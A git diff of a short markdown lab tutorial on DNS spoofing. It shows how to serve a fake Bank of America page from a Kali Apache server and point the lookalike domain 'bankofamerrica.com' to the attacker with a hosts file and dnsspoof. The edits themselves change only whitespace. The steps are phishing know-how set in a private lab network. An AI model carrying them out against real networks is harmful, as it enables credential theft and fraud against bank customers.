@@ -17,6 +17,8 @@ make someone else visit **www.bankofamerrica.com** instead **www.bankofamerica.c
 ## 1. Network Model:  
 - **Attacker: 192.168.1.92**
 - **User: 192.168.1.173 using windows 7 system**  
+
+
 ## 2. Create Webserver:  
 We can you service apache2 in kali linux to create a webserver. we should change content of index.html.    
 ```
@@ -27,6 +29,7 @@ Type: This Is Fake Websites Of www.bankofamerica.com
 ```
 service apache2 start 
 ```    
+
 ## 3. Attack:  
 ```
 vi /usr/local/hosts
@@ -34,7 +37,7 @@ vi /usr/local/hosts
 Type: 
 ```
 192.168.1.92  www.bankofamerrica.com
-```   
+```     
 > :warning: **Warning:** use **TAB** between ip and domain.  
 ```    
 dnsspoof -f /usr/local/hosts
